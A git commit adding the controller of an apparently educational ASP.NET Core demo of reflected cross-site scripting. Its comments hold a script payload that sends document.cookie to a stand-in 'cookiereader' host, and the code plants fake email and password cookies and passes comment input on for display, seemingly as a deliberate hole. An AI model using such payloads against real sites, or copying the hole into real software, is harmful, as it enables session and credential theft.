b7cb9f5471ed506479931a5239fdce06e2c9f86c
Yiğit Can Ayaz <54958108+YigitCanAyaz@users.noreply.github.com>
2022-10-20 18:44:50 +0300

    Added XSS.Web layer for Reflected XSS (Cross Site Scripting) attacks

---
+++ XSS.Web/Controllers/HomeController.cs
@@ -0,0 +1,50 @@
+﻿using Microsoft.AspNetCore.Mvc;
+using System.Diagnostics;
+using XSS.Web.Models;
+
+namespace XSS.Web.Controllers
+{
+    public class HomeController : Controller
+    {
+        private readonly ILogger<HomeController> _logger;
+
+        public HomeController(ILogger<HomeController> logger)
+        {
+            _logger = logger;
+        }
+
+        public IActionResult CommentAdd()
+        {
+            // <script>new Image().src="http://www.example.com/cookiereader?accountinformation="+ document.cookie</script>
+            // <script>alert(document.cookie)</script>
+            HttpContext.Response.Cookies.Append("email", "example@mail.com");
+            HttpContext.Response.Cookies.Append("password", "1234");
+            return View();
+        }
+
+        [HttpPost]
+        public IActionResult CommentAdd(string name, string comment)
+        {
+            ViewBag.name = name;
+            ViewBag.comment = comment;
+
+            return View();
+        }
+
+        public IActionResult Index()
+        {
+            return View();
+        }
+
+        public IActionResult Privacy()
+        {
+            return View();
+        }
+
+        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
+        public IActionResult Error()
+        {
+            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
+        }
+    }
+}
